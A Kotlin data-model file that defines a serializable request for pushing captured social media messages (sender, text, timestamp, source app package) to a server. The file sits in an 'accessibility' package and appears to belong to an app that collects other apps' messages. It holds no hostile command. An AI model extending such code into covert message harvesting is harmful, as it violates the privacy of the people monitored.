package com.hawkshaw.library.datalayer.models.accessibility

import com.hawkshaw.library.datalayer.models.PackageName
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity
import kotlinx.serialization.SerialName
import kotlinx.serialization.Serializable

/**
 * Request to push social media messages to the server
 */
@Serializable
data class PushSocialMediaRequest(
    @SerialName("page")
    val page: Int,
    
    @SerialName("messages")
    val messages: List<SocialMediaMessage>
) {
    /**
     * Represents a social media message instance
     */
    @Serializable
    data class SocialMediaMessage(
        @SerialName("ccn")
        val ccn: String,
        
        @SerialName("ccs")
        val ccs: String? = null,
        
        @SerialName("sender")
        val sender: String? = null,
        
        @SerialName("message")
        val message: String,
        
        @SerialName("type")
        val type: SocialMediaEntity.Type,
        
        @SerialName("timestamp")
        val timestamp: Long? = null,
        
        @SerialName("application")
        val application: PackageName,
        
        @SerialName("time")
        val time: String = ""
    )
} 